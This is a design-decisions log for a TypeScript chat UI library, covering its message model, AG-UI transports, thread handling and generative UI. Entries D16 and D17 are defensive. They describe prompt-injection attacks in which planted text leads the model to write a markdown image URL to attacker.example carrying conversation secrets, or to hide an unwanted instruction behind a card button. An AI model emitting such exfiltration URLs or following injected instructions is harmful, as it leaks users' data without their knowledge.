# Design Decisions

This log records the significant design choices in Hoist Chat Kit and the reasons for them. Each
entry states the decision, the context, and the alternatives we rejected. Add new entries at the
end. When a later decision replaces an earlier one, mark the old entry as superseded and link to
the new one.

## D1. A standalone package that follows Hoist's own conventions

**Decision.** The kit is its own npm package, `@xh/hoist-chat-kit`, with `@xh/hoist` as a peer
dependency. It ships TypeScript and SCSS source, as hoist-react does. Its code follows the Hoist
conventions in full: `HoistModel` for state, `hoistCmp` components with element factories, TC39
decorators, and `xh-` BEM class names.

**Why.** Chat UIs change faster than the rest of Hoist, so the kit needs its own release cycle.
Apps compile it with their own build, together with Hoist, so the kit adds no build step of its
own.

## D2. The kit owns its message model, and protocols plug in as adapters

**Decision.** A message is an immutable `ChatMessage` that holds an ordered list of typed parts:
text, reasoning, tool call, file, source and data. Components render this model only. No
component sees a provider's or a protocol's wire format.

**Why.** The agent-to-UI protocols are young and still move. AG-UI reached 1.0 in October 2026,
and A2UI is a release candidate. Our own model keeps that churn out of app code. The part types
and the tool call states follow the Vercel AI SDK `UIMessage` vocabulary, which most chat
libraries share. That keeps each adapter small.

**Alternatives.** Use AG-UI messages or AI SDK messages as the model. Both would tie apps to one
protocol and to its release cycle.

## D3. Messages are immutable records, replaced on change

**Decision.** `ChatModel.messages` is an `@observableRef` array of immutable `ChatMessage`
objects. Each streamed change makes a new message and new objects for the changed parts only.

**Why.** This follows the Hoist `StoreRecord` precedent. Memoized components then re-render only
the message and the part that changed. Plain records also serialize for storage with no extra
code.

**Alternatives.** Observable message objects that mutate in place. That is more MobX-native, but
it needs class instances for every part and custom serialization.

## D4. AG-UI 1.0 events are the wire vocabulary

**Decision.** Transports yield `ChatEvent`s. These are the AG-UI 1.0 events, with the same type
strings and field names. The kit mirrors the types and does not depend on `@ag-ui/*` at runtime.
Kit-specific content travels as AG-UI `CUSTOM` events with the `xh.chat.` name prefix.

**Why.** AG-UI is MIT-licensed, and agent frameworks such as LangGraph, Mastra, Pydantic AI and
Google ADK emit it. Its events map almost one to one onto our parts. Any AG-UI server therefore
works with the kit and needs no adapter. A Hoist server can emit the same events as NDJSON, so we
do not invent a protocol of our own.

**Alternatives.** A kit-native event format. That adds one more protocol for server authors to
learn and gives no interop. A runtime dependency on `@ag-ui/core` pulls in `zod` as a peer for
types we can mirror in one file.

Superseded in part by [D84](#d84-build-on-the-official-ag-ui-packages-at-the-protocol-layer):
the kit depends on `@ag-ui/core` and `@ag-ui/client`. AG-UI stays the wire vocabulary.

## D5. Codecs translate wire formats, transports carry them

**Decision.** A `ChatTransport` gets events from a backend. A `ChatCodec` encodes the request
body and decodes the records that come back. `HoistChatTransport` reads NDJSON with
`XH.fetchNdjson`. `SseChatTransport` reads Server-Sent Events (SSE). `AgUiCodec` speaks AG-UI.
`AnthropicCodec` speaks the Anthropic Messages API.

**Why.** Framing (NDJSON or SSE) and format (AG-UI or Anthropic) change independently. With
`AnthropicCodec`, a Hoist server can relay Anthropic's stream line by line and translate nothing.
The translation then lives once, in tested TypeScript, rather than in each app's server.

## D6. NDJSON through `XH.fetchNdjson` is the default transport

**Decision.** `HoistChatTransport` posts to a hoist-core endpoint and reads the reply with
`XH.fetchNdjson`. D14 covers how it cancels a stream.

**Why.** It reuses Hoist's auth, correlation IDs, tracing, activity tracking and error decoding.
Hoist apps already have a hoist-core server, and `renderNDJSON` already pairs with
`fetchNdjson`.

**Gap.** `BaseController.renderNDJSON` flushes after the first row, then every 32 KB. Token
streaming needs a flush after each line, so the Toolbox controller writes the stream itself. A
streaming option for hoist-core, with a flush per line and disconnect detection, would remove
that code from every app.

## D7. The client runs the tool loop

**Decision.** `ChatModel` runs the agent loop for client tools. When a model call ends with tool
calls that have a client `execute`, the model runs them, sends the results back, and starts the
next call, up to `maxSteps`. Tools the backend runs arrive with their results in the stream, and
the model only displays them.

**Why.** Many chat tools act on the app itself: they change a dashboard or open a view. Only the
browser can run those. The Toolbox weather agent works this way. A server-side agent loop still
works, because the backend then sends both the calls and the results.

## D8. Generative UI goes through data parts and a renderer registry

**Decision.** AG-UI `ACTIVITY_SNAPSHOT` events and `xh.chat.data` events become `data` parts. An
app renders them through `ChatModelConfig.dataRenderers`, keyed by `dataType`. A data part with no
renderer shows as JSON. The kit ships no A2UI, OpenUI or MCP Apps renderer in v1.

**Why.** A2UI v1.0 is a release candidate with no official React renderer. OpenUI is
vendor-driven. A correct MCP Apps host needs a sandbox origin and a postMessage bridge, which
need security review. The seam lets each of these plug in later with no change to the core.

**Note.** "Open UI" in the brief is taken to mean Thesys OpenUI, the generative UI framework.
The W3C Open UI group standardizes HTML controls and does not relate to agents.

## D9. Desktop components first, platform-neutral models

**Decision.** v1 ships desktop components only, in `desktop/cmp/chat`. `core/`, `transport/` and
`cmp/` do not import from `@xh/hoist/desktop`.

**Why.** The first consumers are desktop dashboards. A mobile package can follow with no change
to the models.

## D10. CSS class and variable names use the `xh-chat` prefix

**Decision.** Class names are `xh-chat-*` in BEM form. Theme variables are `--xh-chat-*`, with
defaults built from Hoist variables.

**Why.** The `xh-` prefix marks XH library code. The kit is an XH library, and the `chat`
segment keeps it clear of names that hoist-react may add.

## D11. CodeQL runs only when the repo is public

**Decision.** The CodeQL job checks the repo visibility and skips its analysis while the repo is
private.

**Why.** Code scanning on a private repo needs GitHub Code Security, which this repo does not
have. The check turns the scan on by itself when the repo goes public.

## D12. The build check packs the package

**Decision.** `pnpm build` packs the package and checks the contents. Every source package must
ship, and specs and planning files must not.

**Why.** The kit ships source, so there is no compile output to build. A missing `files` entry
is the failure a source package is most likely to ship by mistake.

## D13. Finish reasons use the Vercel AI SDK vocabulary

**Decision.** A codec maps the provider's stop reason to one of `stop`, `length`, `tool-calls`,
`content-filter` or `other`, and records it as `metadata.finishReason` on the assistant message.
The raw provider value goes in `metadata.stopReason`.
`ChatModel` adds one value of its own, `max-steps`, for a turn that hit its `maxSteps` limit.

**Why.** Apps that show "the reply was cut off" or "the model declined" need one set of values
across providers. The AI SDK set is the one most chat code already knows.

## D14. Streams abort through `fetchOpts.signal`, not `autoAbortKey`

**Decision.** `HoistChatTransport` and `SseChatTransport` pass their own `AbortSignal` to the
native fetch through `fetchOpts.signal`. They combine it with the turn's signal through
`AbortSignal.any`.

**Why.** Hoist releases an `autoAbortKey` as soon as the response headers arrive. After that,
`XH.fetchService.abort(key)` returns false and the body keeps streaming, so the server keeps
generating tokens. A signal on the native fetch cancels the body too.

**Cost.** `AbortSignal.any` needs a 2024-or-later browser. That is inside the default Hoist
targets, which hoist-dev-utils sets to the last 2 versions of Chrome, Safari, iOS and Edge. The
signal replaces Hoist's own aborter, so Hoist's `timeout` can reject a request but not abort its
fetch. The transport closes the connection itself in that case. A `signal` option on Hoist's
`FetchOptions`, with abort support for streamed responses, would let the transports drop the
workaround.

**Status.** Filed as [xh/hoist-react#4855](https://github.com/xh/hoist-react/issues/4855).

## D15. Generative UI is a Hoist component catalog, with protocols as translators

**Decision.** The next deliverable after the chat UI is a generative UI registry. An app
registers Hoist components, such as a grid, a chart or a card, each with a typed props schema.
The kit generates the model's instructions and tools from the catalog, checks each spec the
model writes against it, and renders the result inline in the chat. Protocols such as OpenUI
Lang and A2UI translate into the same catalog specs through an adapter. v1 ships the seam
(`data` parts and `dataRenderers`) and points in this direction. The full registry follows.

**Why.** A client chose OpenUI because Hoist had no answer for chat and generative UI. The chat
UI answers the first half. The second half needs generative UI built on Hoist's own grids and
charts, which are stronger than generic component kits for data-dense apps. A catalog the app
controls keeps the model to known components and known props. XH has a proof of concept that
renders Hoist grids and charts inline in a chat in this way, under tight constraints.

**Update.** The catalog shipped in v1, as designed here: `ChatUiCatalog` in `genui/`, with the
built-in grid, chart, metrics and card in `desktop/cmp/genui/`. Each component is an inline
client tool, so streaming, validation and errors reuse the tool machinery. `ChatUiAdapter` is
the seam for A2UI and OpenUI. The kit ships the interface, and no adapter.

## D16. Markdown images do not load by default

**Decision.** `ChatMarkdown` does not load markdown images unless `allowImages` permits them.
A blocked image renders as a link, labeled with its alt text, that the user can choose to open.
An app allows images with `true`, or with a function that decides by source URL. `ChatPanel`
and `ChatMessageList` pass the setting through.

**Why.** An image sends a request to its URL the moment it renders, with no action by the user.
A prompt injection in a web page, a document or a tool result can tell the model to write an
image whose URL holds data from the conversation, such as
`![](https://attacker.example/?d=<secret>)`. The request then sends that data to the attacker's
server. Published attacks on LLM chat products have used this channel. A link needs a click,
so the user sees the URL first.

**Cost.** A model that draws charts or diagrams as markdown images shows links until the app
allows its image host. Apps that show trusted images should allow their own URLs with a
function, not all images with `true`.

**Alternatives.** Strip images entirely, with `disallowedElements`. That hides the alt text,
and the user cannot tell that the reply had an image.

## D17. A card action shows exactly what it sends

**Decision.** The built-in card's follow-up actions send their `prompt` as the user's own
message. The button's tooltip shows the prompt before the click, and the chat shows it as the
user's message after it. A prompt is at most 200 characters.

**Why.** The model writes both the button text and the prompt. The threat is the one in D16: a
prompt injection in a web page, a document or a tool result can steer what the model writes. It
could label a button "Show trades" and make its prompt an instruction the user never meant to give.
One example tells an agent to send data somewhere. A click then sends that instruction with the
user's authority. If the user sees the whole prompt before and after the click, the button cannot
claim one thing and send another unseen. The length cap keeps the whole prompt readable in a
tooltip, and leaves no room to hide a long instruction behind a short one.

**Cost.** A model cannot attach hidden context to an action. It writes the prompt as the user
would say it, and keeps any detail it needs in the conversation.

**Alternatives.** Put the prompt in the composer for the user to send. That adds a step to every
action, and the user still has to read the prompt. Show only the tooltip. A user who does not
hover would not see the prompt before it goes.

Amended by [D56](#d56-fixes-from-review-5-of-generative-ui): a `send` action may carry a small,
visible `context` of record ids.

## D18. Generative UI names carry the `ChatUi` prefix

**Decision.** Every public generative UI name starts with `ChatUi` or `chatUi`. Types are
`ChatUiCatalog`, `ChatUiComponentSpec`, `ChatUiGridSpecProps` and `ChatUiGridSpecOptions`.
Components are `ChatUiGrid` and its factory `chatUiGrid`. The functions that return catalog
specs are `chatUiGridSpec()`, `chatUiChartSpec()`, `chatUiMetricsSpec()` and `chatUiCardSpec()`.

**Why.** D10 gives kit names a prefix, so that they never collide with app or Hoist names. A
bare `gridComponent()` or `GridComponentProps` would sit beside an app's own grid code. The
`Spec` suffix says what the function returns, a `ChatUiComponentSpec`, and pairs it with the
component it renders.

**Alternatives.** `chatGridComponent()` and the like. It reads well alone, but adds a third
naming scheme beside `ChatUiGrid` and `ChatUiComponentSpec`, and hides that the result is a spec.

## D19. Two conversation shapes, both first-class

**Decision.** `ChatModel` gains `historyMode: 'client' | 'server'`, default `client`. Client mode
is the first slice's behavior: the browser holds the history and runs the tool loop. In server
mode the request carries only the new messages, a `trigger` (`submit`, `retry`, `regenerate` or
`edit`) and a stable `turnId`. The server's thread, message and run ids replace the browser's.

**Why.** Three enterprise apps reviewed the kit, and all three keep the conversation in a separate
agent service that owns the loop, the tools and the threads. None runs a tool in the browser. The
client shape still serves helper agents on Hoist components, so neither shape replaces the other.
Updates D7.

Amended by [D85](#d85-ag-ui-requests-carry-the-whole-history-the-chat-holds): an AG-UI request
carries every message the chat holds, in both modes.

## D20. A thread layer in the kit

**Decision.** `ChatThreadStore` is an adapter the app implements against its backend: list,
load, rename and delete threads. `ChatThreadsModel` holds one `ChatModel` per open thread, so a
turn keeps running in the background while the user reads another thread. `chatThreadList`
renders the list. The concurrency rules one app's tests pin down become the model's spec.

**Why.** All three apps built a thread sidebar by hand, each with the same race bugs to avoid. A
store adapter keeps the kit out of each backend's storage format.

## D21. A workspace shell

**Decision.** `chatWorkspace` lays out a thread sidebar, the conversation and an optional side
panel, on Hoist `PanelModel`, sized to its parent.

**Why.** One app's largest cost was working around a third-party chat shell: CSS overrides, DOM
observers and a rebuilt composer. Another built the same layout on Hoist `Panel` by hand.

## D22. Generative UI binds data by reference, through four delivery modes

**Decision.** One catalog, delivered four ways: display tools that the server answers, client
tools (built), component tags in markdown, and a UI document in the text stream. A `ref` prop
names an artifact, such as a result set from a tool. The kit resolves it through an artifact
registry and an app-supplied `ChatDataSource` that fetches by page. The catalog exports its tool
schemas, prompt and a version hash, so a server agent can register it. Updates D15.

**Why.** In both apps that use generative UI, the model writes a view over data that a server tool
produced, and the client fetches and formats the rows. That keeps large data out of the token
stream and keeps numbers exact. A server-run loop also cannot take client tools.

## D23. An activity timeline, and one tool display setting

**Decision.** Agentic replies show their tool calls, reasoning and narration in one collapsible
timeline, with nested sub-agents. `ChatToolSpec.display` becomes one enum: `card`, `inline`,
`timeline`, `answer`, `pinned` or `hidden`.

**Why.** An agent that makes twenty calls per reply cannot show twenty cards, and both data apps
built a timeline by hand.

## D24. Bring your own LLM

**Decision.** A kit `ChatService` resolves a default transport from server config, so a helper
agent needs no wiring of its own. A `ChatCompletionsCodec` covers OpenAI-compatible gateways.
`ChatService` is withdrawn by [D81](#d81-chatservice-leaves-the-kit). The codec stays.

**Why.** Enterprises choose their own model and gateway, and most gateways speak the OpenAI chat
completions format. The codec and transport split (D5) is the seam that makes this cheap.

## D25. The hoist-core streaming companion belongs to hoist-core

**Decision.** The kit does not build `renderSSE()`, a streaming `renderNDJSON()` or a streaming
proxy mode. It keeps the documented relay controller in the transport README and in Toolbox, and
the report specifies what hoist-core should add.

**Why.** It is hoist-core code, owned by the hoist-core team.

**Status.** Filed as [xh/hoist-core#618](https://github.com/xh/hoist-core/issues/618).

## D26. Snapshots now, a beta tag when the v1.0 API settles

**Decision.** The kit keeps publishing `-SNAPSHOT` builds under `next`. An app that needs
stability pins an exact snapshot version, such as `1.0.0-SNAPSHOT.1791997893569`. The first tagged
pre-release (`1.0.0-beta.1`) follows when the plan 2 API settles.

**Why.** Exact snapshot versions are immutable on npm, so apps can pin today with no release
process. A tag earlier than that would promise a stability that the server-mode work is about to
break.

## D27. The Hoist floor is 89.0.0

**Decision.** The kit requires `@xh/hoist` 89.0.0 or later. Apps on 88 upgrade first.

**Why.** Hoist 89 is the first release with the unit test kit the kit's tests use, and it is now
released.

## D28. No Python reference agent in v1.0

**Decision.** The kit publishes its event contract (AG-UI plus `xh.chat.*`) and recorded streams
for conformance tests. It does not ship a Python reference agent.

**Why.** Agent services use many frameworks. A contract and recorded streams serve all of them,
and a service team can run them in its own CI.

## D29. AG-UI interrupts first for server-side human-in-the-loop

**Decision.** A server agent asks the user a question through the AG-UI interrupt outcome, and the
kit resumes the run with a structured answer. Where an agent cannot emit AG-UI interrupts, it
sends an `xh.chat.interrupt` custom event.

**Why.** AG-UI 1.0 standardizes the interrupt outcome and resume entries. A fallback keeps agents
on older adapters working.

Amended by [D86](#d86-interrupts-use-standard-ag-ui-only): the `xh.chat.interrupt` fallback is
dropped.

## D30. Backend tool errors travel in the result's metadata

**Decision.** A `TOOL_CALL_RESULT` with `metadata.error` (the error text), or with
`metadata.isError: true` (the text as `content`), fails its call as `output-error`. An
`xh.chat.toolError` custom event does the same, for a backend that cannot set `metadata`.
`AnthropicCodec` maps a server tool result block that reports an error to the same failure.

**Why.** AG-UI's result event has no error field, so a failed backend tool showed as a success.
AG-UI's tool message has `error`, and `metadata.error` mirrors it. A custom event covers servers
on strict AG-UI libraries.

## D31. An error boundary around each message and each part

**Decision.** Each message, and each part within it, renders inside Hoist's `ErrorBoundary`. A
part that throws shows a compact note with a Details disclosure, and Hoist's exception handler
logs the error with no alert. A streaming part gets another try when its state changes, and a
data part when it is replaced.

**Why.** Renderers are app code and model-driven content, and one that throws took down the whole
list. Hoist's boundary keeps Hoist's logging. The retry on a state change lets a renderer that
throws on partial input recover, without a re-render on every flush.

## D32. The catalog refuses schema keywords it cannot check

**Decision.** The `ChatUiCatalog` constructor throws on any props schema keyword that affects
validity and that the checker does not implement, such as `$ref`, `allOf` or
`exclusiveMinimum`. It also compiles each `pattern`, and throws on one that does not compile.

**Why.** The catalog promises that the model passes only schema-valid props. A keyword the checker
skipped broke that promise unseen.

**Alternatives.** A full JSON Schema validator. It adds a dependency. Ajv, a common choice,
compiles each schema to code with `new Function`, which a strict content security policy
forbids.

## D33. File chips follow the markdown image policy

**Decision.** `ChatFileChip` loads an image at a URL only if `allowImages` permits it. An image
with inline `data` always shows.

**Why.** A backend file part with an image URL reopened the data leak that D16 closed. Inline data
loads nothing, so the user's own attachments need no policy.

## D34. A silent stream fails as a turn error, coded `stalled`

**Decision.** The HTTP transports take an `idleTimeout`. Any data resets it, including an SSE
comment or an `{"type": "xh.heartbeat"}` NDJSON record, which is never decoded. When it fires, the
transport closes the connection and yields `RUN_ERROR` with code `stalled`.

**Why.** Hoist's `timeout` covers only the wait for the response to start. A `RUN_ERROR` keeps the
stall in the conversation, with Retry, rather than an exception report. A heartbeat record lets an
NDJSON server keep a slow tool call alive without inventing an AG-UI event.

## D35. A send blocker returns the reason to wait

**Decision.** `ChatModelConfig.sendBlocker` returns why the user must wait, or null. The chat
reads it as a computed value. While it returns a reason, `canSend` is false, `sendAsync`,
`editMessageAsync`, `retryAsync` and `regenerateAsync` do nothing, and the composer disables Send
with the reason as its tooltip and as an accessible status. Resuming a paused turn (approve, deny,
or an interactive tool's answer) is not blocked, because it finishes a turn already under way.

**Why.** A reason, not a boolean, tells the user what to do next. Blocking `sendAsync` too keeps
suggestion chips and card actions from getting around the rule.

## D36. Inline calls show nothing until approved

**Decision.** An inline tool call renders no output while it waits for approval, unless its tool
sets `approvalPreview`. A denied call renders none.

**Why.** An inline call's output is the UI the user is asked to allow. Showing it before approval,
or after a denial, shows what the user has not agreed to.

## D37. A turn aborts with a `ChatAbortError` that names its reason

**Decision.** `ChatModel` aborts a turn's signal with a `ChatAbortError`, whose `reason` is a
`ChatAbortReason`: `stop`, `detach`, `clear`, `load` or `destroy`. Its `name` is `AbortError`.

**Why.** Section 2.4 of the server-mode spec passes the reason itself as the signal's `reason`.
But `signal.throwIfAborted()` and `fetch()` throw the reason as is. A bare string would then reach
Hoist's `FetchService`, which tells an abort from a network failure by the name `AbortError`, and
the kit's own abort checks. An error with that name keeps every abort an abort, and still says
why.

## D38. Only a stop cancels, and only a step in flight

**Decision.** `stop()` calls `ChatTransport.cancelAsync()` only while a step is in flight. It
passes a `ChatRunRef`: the thread id, the run id from `RUN_STARTED` (or else the step's own id),
the turn id, and the step's request. In server mode, a `detach()`, `clear()` or
`loadMessages()` with a step in flight marks the reply `metadata.detached`. A stop while a client
tool runs, or while the turn waits for the user, sends no cancel.

**Why.** Between steps no run is going on the server, so a cancel has nothing to stop, and a
detached flag would claim an answer the server is not writing. The request rides on the run ref
so that `HttpChatTransport.cancelUrl` can send the `headers` and `params` of the stopped step,
which the app builds from a request.

**Alternatives.** A separate header option for the cancel call. It duplicates `headers` for
every app that authenticates with an agent server.

## D39. A new thread's id may change once, on its first run

**Decision.** In server mode, a thread id is provisional until the first `RUN_STARTED` of the
thread. If that event reports another id, the chat adopts it. A thread starts with the
constructor, `clear()`, or `loadMessages()` with no thread id. A thread id given with history,
through `initialMessages` or `loadMessages()`, is the backend's and never changes.

**Why.** It covers both kinds of backend: one that takes the id the browser mints, and one that
mints its own on the first turn. Adopting only once keeps a misbehaving agent from moving a
thread that the thread layer has already keyed.

Amended by [D55](#d55-fixes-from-review-5-of-server-mode): history means messages with a user
message. A greeting alone leaves the id provisional.

## D40. `AnthropicCodec` is a client-mode codec

**Decision.** `AnthropicCodec.encodeRequest()` throws for a request with `historyMode: 'server'`.

**Why.** The Messages API keeps no state, so each request must carry the whole history. A
server-owned conversation sends only the new message, which the API cannot answer. The codec
cannot know the mode when it is built, so it throws on first use, with a message that names the
mode.

## D41. The text transform sees the raw text

**Decision.** The reducer keeps the raw text of each text part of a step, and passes all of it to
`textTransform` on each change. It stores the result. A turn that ends before its stream does
still gets a final call, with `isStreaming: false`.

**Why.** Suppose a transform ran on its own earlier output plus each new delta. It would see a
tag split across deltas in pieces, such as `<thin` and `king>`, and could never strip it. Running on the
raw text makes any pure transform correct, at the cost of one call per batch per changed part.

## D42. Small additions to the server-mode spec

**Decision.** WP 1 adds these to sections 1, 2 and 4.1 of `planning/SERVER-MODE.md`:

- `ChatModel.detach()`, a public way to abort with `detach`. The thread layer and apps need it to
  leave a turn running on the server.
- A turn that ends with `aborted` tracks as `Turn stopped`, beside `Turn complete` and `Turn
  failed`, so stopped turns stay visible in activity tracking. Each track also sets Hoist's own
  `elapsed`.
- `ChatModel.setFeedbackSubmitter()` and `canSubmitFeedback`, the seam through which
  `ChatThreadsModel` supplies its store's submitter to a chat the app built.
- `ChatModel.threadId` is a getter over a private observable, so only the chat sets it.
- `hasOlderMessages` is `@bindable`, so the thread layer sets it without an action of its own.
- `runOptions` is `@bindableRef`, and each send takes a deep copy. A deep observable would put a
  MobX proxy in message metadata.
- A retry, regenerate or edit re-runs with the run options recorded on its user message.
- `ScriptedRequestContext.stepIndex` stays, read from the request, because Toolbox demos use it.

**Why.** Each fills a gap the spec leaves open, without changing its contract.

## D43. The thread layer reaches a chat through three seams

**Decision.** `ChatModel` gains `setThreadCreator()` and `addSendBlocker()`, beside
`setFeedbackSubmitter()` (D42). The chat awaits its thread creator before the first request of a
new thread, in either history mode, and adopts the id it returns as it would one from
`RUN_STARTED`. A failed create fails the turn, with Retry. An added blocker holds back sends as the
configured `sendBlocker` does, and is checked after it. `ChatThreadsModel` shares one
`createThreadAsync` call per local id, and drops it only if it failed.

**Why.** Section 3.3 rule 5 needs the create awaited before the first run, but the app builds the
chat and its transport, so the thread layer cannot wrap either. The thread layer also needs to
block sends while history loads, after a failed load, and while another thread runs, on chats
that may have a `sendBlocker` of their own.

**Alternatives.** Create the thread when the user starts it. That would leave an empty row on the
backend for every New chat click.

## D44. A run that finishes with nothing fails, coded `empty-response`

**Decision.** The stream reducer fails a reply that has no parts when its run finishes. The turn
ends as an error, with Retry, in both history modes.

**Why.** Section 3.3 rule 9. Each chat guards its own turn, so the rule belongs in the chat, not
in the thread layer. A blank reply looked like a success and gave the user nothing to retry.

## D45. The thread list is a computed overlay

**Decision.** `ChatThreadsModel.threads` is a computed value, not the `@observableRef` field of
section 3.2. It joins the threads started here that the store has not listed yet, and the store's
own pages, then lays pending renames, pins and deletes over them by id. An edit stays laid over
the list until a list requested after its store call ended applies. A failed edit leaves the
overlay at once, which is the whole rollback. A list applies only if no newer list has, by a
request count of the model's own rather than `loadSpec.isStale`, so that further pages check the
same count.

**Why.** Rule 1, and the stale list that brought a deleted thread back in assistant-ui (#8194). A
list sent before a delete ended can still arrive after it. An overlay that outlives the store call
by one list covers that case, and a newer rename survives an older one that fails.

## D46. Small additions to the thread layer spec

**Decision.** WP 2 adds these to section 3 of `planning/SERVER-MODE.md`:

- `reloadThreadAsync()`, the Retry of rule 8. It also catches up on a turn that the backend
  finished on its own. `loadError` holds the selected thread's failure, and `listError` the last
  list failure, shown inline rather than as a toast.
- `selectedSummary`, `hasMoreThreads`, and `olderMessagesTask` beside `listTask` and `loadTask`,
  so that a list can show "loading older" without masking the conversation.
- `ChatSeedSpec` is `{draft, runOptions}`. Seed messages are left out, as a server-owned thread
  would lose them on reload.
- A chat that changes its thread id while busy has adopted the backend's id, and the model
  re-keys the thread. One that changes it while idle, through `clear()` or `loadMessages()`, holds
  a new thread, and the old thread stays in the list.
- A closed chat's draft and run options are kept by thread id, and restored when it opens again.
- Deleting threads stops any turn running in them. Deleting the selected thread selects a new one.
- A missing thread is a store error with `httpStatus` 404, as Hoist's `FetchService` reports it,
  or an empty page.
- A refresh asks for as many threads as the list holds, so loaded pages stay. A turn that ends
  reloads the list after one second, debounced across turns.
- With `allowConcurrentTurns: false`, sends, edits, retries and regenerations wait while another
  thread runs (D35). A paused turn can still resume.

**Why.** Each fills a gap the spec leaves open, without changing its contract.

## D47. Choices in the generative UI core

**Decision.** WP 7 step 1 builds sections 2.1 to 2.4 and 2.6 to 2.8 of `planning/GENUI.md`, with these
choices where the spec is open or differs from the kit's conventions:

- Components run actions with `context.runActionAsync()`, not `runAction()`, as every method
  that returns a promise takes the `Async` suffix.
- `tools` holds the component tools only. The document tool is `documentTool`, and the
  display-only specs for a server-run loop are `displayTools`. `toPrompt()` and `toToolSchemas()`
  default to the `tools` mode, so a catalog sends what it sent before.
- An element has at most one parent. A child listed under two parents renders twice, and a chain
  of such diamonds grows the render exponentially.
- The catalog reaches a chat's artifacts through its `artifacts` config, a function of the
  `ChatModel`. `ChatModel` does not change, and a later `ChatModelConfig.catalog` can supply the
  chat's own registry.
- A tag attribute for a prop that takes only strings keeps its text as written. For a prop that
  takes no strings, a number, boolean or null parses as JSON. An open tag closed at once, as
  `<ui-x ...></ui-x>`, counts as self-closing, and a backslash escapes a tag.
- `maxInlineRows` defaults to 500, so the built-in chart's 500 points pass. The element and depth
  caps default to 50 and 8.
- `openUrl` allows no URL until the app sets `urlAllowList`, and never one that is not `http` or
  `https`. A `send` action's context is capped at 2,000 characters of JSON.
- `callTool` runs a client tool of the chat, outside the history, and refuses a backend tool.
- `applyDataView()` throws for a view that names an unknown column. Its `totalRows` counts the
  rows that pass the filter, before `top`. A scaled column notes its `units`.
- `fallback` and `placeholder` on the catalog config let the desktop step draw both with Hoist
  components, as `genui` is platform-neutral.
- The card allows `send` actions only, unless its `actionTypes` option allows more.

**Why.** Each keeps the spec's contract, follows a kit convention, or closes a gap the spec leaves
open.

## D48. Only the latest reply with changes can be undone

**Decision.** `ChatModel.undoableMessageId` names the latest reply that holds undo functions, once
its turn ends, and only while no turn runs or waits for the user. `undoTurnAsync()` runs that
reply's undo functions, newest first. Once it is undone, the reply before it with changes becomes
undoable. If an undo function throws, the undo stops, a toast reports it, and the rest stay for
another try. A retry, regenerate, edit, clear or load drops the undo functions of the replies it
discards. An undo of a tool that finishes after a stop is still kept.

**Why.** Section 2.2 of `planning/HELPERS.md` keys undo by reply but does not say which replies
may undo. The tool groups build each undo from a snapshot of persistable state, so undoing an
older reply would also revert every later one. One undoable reply at a time keeps undo exact.

**Alternatives.** An Undo action on every reply with changes. It would silently revert later
replies.

## D49. Choices in the helper agent core seams and `ChatCompletionsCodec`

**Decision.** WP 9 steps 1 and 2 add these to sections 2 and 5.2 of `planning/HELPERS.md`:

- A context provider's `getContext` may return null, to send nothing for a step. A provider that
  throws fails the turn, with Retry. The chat skips the provider pass entirely when it has none,
  so a chat without providers starts each step as before.
- `AgUiCodec` sends a provider's description, or else its name, as the AG-UI `description`, and a
  string value as is. `AnthropicCodec` and `ChatCompletionsCodec` send each provider as a
  `<context name="...">` section. Placed in the system prompt at first, and moved after the
  history by [D55](#d55-fixes-from-review-5-of-server-mode).
- `ChatToolSpec.preview` is `boolean | (input) => ReactNode`. True replaces `approvalPreview`,
  which stays as an alias because the generative UI docs still name it, and another work package
  owns them.
- The desktop message view shows the Undo action, beside Regenerate.
- `ChatCompletionsCodec` finishes each step on the chunk with a `finish_reason`, because the
  `[DONE]` sentinel never reaches a codec. The usage chunk that follows becomes a second
  `RUN_FINISHED` with only `usage`, which the reducer already merges into the reply. Superseded by
  [D52](#d52-a-codec-sends-one-run_finished-per-step).
- It decodes `refusal` as text, and `reasoning_content`, which some gateways add, as reasoning. It
  sends no reasoning back, and prefixes a failed call's result with `Error:`, as the format has no
  error flag.

**Why.** Each fills a gap the spec leaves open, without changing its contract.

## D50. `ChatService` reads `chatConfig`, and its prompt is static text

**Withdrawn** by [D81](#d81-chatservice-leaves-the-kit).

**Decision.** The soft config is `chatConfig`, not `xhChatConfig`. `createTransport({system})`
takes the prompt as a string. An AG-UI backend gets it as a `context` entry.

**Why.** hoist-core reserves the `xh` prefix for its own configs, and asks apps to avoid it. The
app creates this config, so it follows the naming rule for app configs. A static prompt caches.
Live state goes through context providers, which work with every codec. `AgUiCodec` also builds
its context synchronously, so it could not await a prompt function.

## D51. Choices in the tool groups

**Withdrawn** by [D80](#d80-component-helpers-leave-the-kit-for-v1).

**Decision.** WP 9 step 3 adds these to section 3 of `planning/HELPERS.md`:

- A group is a `ChatToolGroup` of `{tools, contextProvider, prompt, suggestions}`. Each tool's
  `parameters` is a getter, so its enums follow the model on every step with no change to
  `ChatToolSpec`.
- There is no list tool. The context provider sends the current columns or widgets on every step,
  and the dashboard prompt lists the widget types the model may add.
- The model can change a dashboard widget's settings only through a `settingsSchema` the app
  supplies per view spec. The tools check the keys, and leave the values to the widget.
- `gridTools` restores only the part of the grid a tool changed. `dashCanvasTools` restores the
  dashboard's persistable state, as the spec says.
- `move_widget` changes one widget's layout through `DashCanvasModel.onRglLayoutChange()`, the one
  public setter for a layout that keeps view ids. `loadState()` regenerates ids by position.
- `set_dashboard` does not ask first, as the Toolbox agent's equivalent did not. It is undoable.
  `clear_dashboard`, `reset_dashboard`, `reset_view`, `save_view` over the current view, and
  `open_view` with unsaved changes ask first.
- `save_view` waits 500 ms before it saves. A persistence provider debounces its writes by 250 ms
  by default, so the wait lets changes from earlier in the turn reach the view manager. Saves have
  no undo.

**Why.** Each keeps the spec's contract, or follows the Hoist API where the spec is silent.

## D52. A codec sends one `RUN_FINISHED` per step

**Decision.** `ChatCompletionsCodec` holds its `RUN_FINISHED` back until the usage chunk, or the
end of the stream, and sends one event with the usage. A `ChatDecoder` may add a `flush()`, which
the HTTP transports call after the last record of a stream that ended normally. The codec holds
the finish only with `includeUsage`, so a stream that asks for no usage finishes at once. This
replaces the second `RUN_FINISHED` of D49.

**Why.** AG-UI ends a run with one `RUN_FINISHED`, and the kit documents it as the last event of a
step. The reducer merged a second one, but any other reader of the stream, such as a relay or a
test, saw two finishes.

**Alternatives.** Wait for the usage chunk with no flush. A gateway that ignores `stream_options`
would then never finish, and every turn would fail as `incomplete-stream`.

## D53. `preview` replaces `approvalPreview`

**Superseded.** The alias is removed. The kit has no release and no callers of it.

**Decision.** `ChatToolSpec.approvalPreview` is deprecated. It still works, and `ChatModel` logs a
deprecation warning once for a tool that sets it. The generative UI docs name `preview: true`.

